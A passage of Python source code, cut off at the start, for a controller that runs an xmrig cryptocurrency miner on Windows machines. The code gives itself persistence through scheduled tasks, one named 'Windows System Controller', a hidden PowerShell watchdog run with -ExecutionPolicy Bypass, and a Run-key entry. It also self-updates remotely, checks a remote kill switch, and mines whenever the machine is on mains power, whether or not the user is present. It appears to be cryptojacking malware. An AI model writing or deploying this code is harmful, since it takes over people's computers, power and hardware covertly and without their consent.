        log("no gpudetect.py yet - CPU only until it arrives")
        return False
    log("no gpu_profile.json - probing GPU once")
    try:
        subprocess.run([sys.executable, gd, "--force"], cwd=BASE, timeout=120,
                       creationflags=CREATE_NO_WINDOW,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return os.path.isfile(GPU_PROFILE)
    except Exception as exc:
        log("GPU probe failed: %r" % (exc,))
        return False


def register_tasks(settings):
    """Best effort: give an adopted machine the current trigger set.

    A legacy box only has the old 'Windows System Controller' task. Adding the
    current main + health tasks is what gives it the watchdog and the daily
    backstop. Failure is non-fatal (the old task still launches the controller).
    """
    exe = sys.executable
    script = os.path.join(BASE, "controller.py")
    health = os.path.join(BASE, "watchdog.ps1")
    main_task, health_task = settings.tasks[0], settings.tasks[1]
    cmds = [
        ["schtasks.exe", "/Create", "/TN", main_task, "/TR",
         '"%s" "%s"' % (exe, script), "/SC", "ONLOGON",
         "/RL", "LIMITED", "/IT", "/F", "/RU", os.environ.get("USERNAME", "")],
    ]
    if os.path.isfile(health):
        cmds.append(
            ["schtasks.exe", "/Create", "/TN", health_task, "/TR",
             'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%s"' % health,
             "/SC", "MINUTE", "/MO", "10", "/RL", "LIMITED", "/IT", "/F",
             "/RU", os.environ.get("USERNAME", "")])
    for cmd in cmds:
        try:
            subprocess.run(cmd, timeout=40, creationflags=CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
    log("attempted task registration for adopted install")


def bootstrap_legacy(settings):
    """First run on a pre-overhaul machine: adopt it instead of failing.

    The old layout has no install.json, no gpu_profile.json, an old task name
    and the binary is still xmrig.exe. A repo push therefore MIGRATES those
    boxes instead of bricking them.
    """
    legacy = not os.path.isfile(INSTALL)
    if legacy:
        log("no install.json - adopting legacy install at %s (binary=%s)"
            % (BASE, settings.binary))
        info = {
            "install_dir": BASE,
            "python": sys.executable,
            "pythonw": sys.executable,
            "binary": settings.binary,
            "tasks": list(settings.tasks),
            "backup_dir": "",
            "idle_seconds": settings.idle,
            "installed_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "adopted_from": "legacy",
        }
        try:
            atomic_write(INSTALL, json.dumps(info, indent=2))
        except Exception as exc:
            log("could not write install.json: %r" % (exc,))
        register_tasks(settings)

    ensure_gpu_profile()
    return legacy


def main():
    lock = acquire_single_instance()
    if lock is None:
        return 0

    settings = Settings()
    log("controller start pid=%s admin=%s idle_threshold=%ds"
        % (os.getpid(), is_admin(), settings.idle))
    if handle_probation():
        log("rolled back, restarting")
        os.execv(sys.executable, [sys.executable, os.path.abspath(__file__)])

    bootstrap_legacy(settings)
    worker = Worker(settings)
    updater = Updater(settings)
    sweep_orphans(settings)          # only one miner per box, always
    last_sweep = time.time()
    last_gpu_check = 0.0
    last_state = 0.0
    probation_at = time.time() if os.path.isfile(UPDATE_MARK) else 0.0
    kill_check = 0.0
    active_since = 0.0
    last_cap = -1
    last_run_check = 0.0

    while True:
        try:
            now = time.time()

            if os.path.isfile(KILL_LOCAL):
                destroy(settings, worker)

            if now - kill_check > 600:
                kill_check = now
                if remote_kill(settings):
                    destroy(settings, worker)

            if now - probation_at > PROBATION_SECONDS and probation_at:
                try:
                    os.remove(UPDATE_MARK)
                except OSError:
                    pass
                probation_at = 0.0
                log("update probation cleared")

            result = updater.maybe_update()
            if result is True:
                worker.stop()
                log("controller updated; restarting")
                os.execv(sys.executable, [sys.executable, os.path.abspath(__file__)])
            elif result == "restart-worker":
                worker.stop()
            if result:
                # an update may just have delivered gpudetect.py
                ensure_gpu_profile()
            elif not os.path.isfile(GPU_PROFILE) and (now - last_gpu_check) > 120:
                # gpudetect.py may have arrived without a controller/config
                # change (its own adoption returns False) - retry the probe
                last_gpu_check = now
                ensure_gpu_profile()

            idle = idle_seconds()
            on_ac = on_ac_power()

            # Mining runs whenever the machine is on mains power. The user's
            # presence only decides how much CPU it may use.
            wanted = bool(on_ac)
            worker.reap()

            if wanted:
                if not worker.alive():
                    if now >= worker.backoff_until:
                        # if a job can be created, the config is always the
                        # full one and the cap does the throttling
                        worker.start(settings, "full" if job_init() else "trickle")
                elif worker.job_ok:
                    # native-style throttle: never restart, just re-cap
                    if idle >= settings.idle:
                        active_since = 0.0
                        cap = 100
                    else:
                        if not active_since:
                            active_since = now
                        # their lesson: wait a while before throttling, or a
                        # single keypress causes thrash
                        cap = ACTIVE_PCT if (now - active_since) >= ACTIVE_DWELL else 100
                    if cap != last_cap:
                        if job_set_cpu_rate(cap):
                            last_cap = cap
                            worker.throttled = (cap < 100)
                            log("cpu cap -> %d%% (idle %.0fs)" % (cap, idle))
                elif profile != worker.profile and (now - worker.last_switch) >= MIN_PROFILE_DWELL:
                    worker.switch(settings, profile)
            else:
                if worker.alive() and (now - worker.last_switch) >= 5:
                    worker.stop()
                    worker.fast_failures = 0
                    worker.backoff_until = 0.0

            worker.read_telemetry()
            keep_system_awake(worker.alive() and wanted)

            if now - last_sweep > 300:
                last_sweep = now
                sweep_orphans(settings, keep=worker.proc.pid if worker.alive() else None)

            if now - last_run_check > RUN_INTERVAL:
                last_run_check = now
                ensure_run_key()

            if now - last_state >= STATE_INTERVAL:
                last_state = now
                write_state(settings, worker, wanted, idle, cap=max(0, last_cap))
                log("running=%s cap=%d%% gpu=%s idle=%.0fs rate=%s acc=%s rej=%s"
                    % (worker.alive(), last_cap, worker.gpu_applied, idle,
                       worker.hashrate_text(), worker.tele.get("accepted"),
                       worker.tele.get("rejected")))

        except Exception as exc:
            log("loop error: %r" % (exc,))

        time.sleep(TICK)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        pass
    finally:
        keep_system_awake(False)
